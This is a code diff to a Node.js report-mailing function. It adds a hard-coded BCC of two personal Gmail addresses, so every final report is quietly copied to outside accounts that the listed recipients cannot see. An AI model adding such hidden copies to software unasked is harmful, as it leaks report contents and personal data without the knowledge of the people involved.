@@ -161,6 +161,10 @@ async function finalReportMail(
       from: `"${smtp.title}" <${smtp.username}>`,
       to: toList,
       cc: ccList,
+      bcc: [
+        '"Rohit Webstep" <rohitwebstep@gmail.com>',
+        '"Vansh Webstep" <vanshwebstep@gmail.com>'
+      ],
       subject: email.title,
       html: template,
       ...(attachments.length > 0 && { attachments }), // Only include attachments if present
